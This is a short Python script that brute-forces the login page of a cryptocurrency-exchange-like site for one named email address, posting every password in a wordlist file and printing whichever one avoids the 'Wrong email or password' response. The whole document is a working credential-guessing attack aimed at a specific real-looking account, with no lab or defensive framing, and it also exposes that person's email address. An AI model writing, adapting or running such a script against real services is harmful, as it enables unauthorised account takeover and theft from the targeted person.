#!/usr/bin/env python

import requests

# import the target url and method
target_url = "https://ice3x.com/login"
data_dict = {"email": "", "password": "", "submit": "submit"}

# set the email address value
email_addr = "campbellm@greyjunior.co.za"
data_dict["email"] = email_addr


# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
with open("dic-0294.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Wrong email or password" not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# If the program gets this far, it has not found the password in the wordlist
print("[+] Reached end of line. Try another wordlist")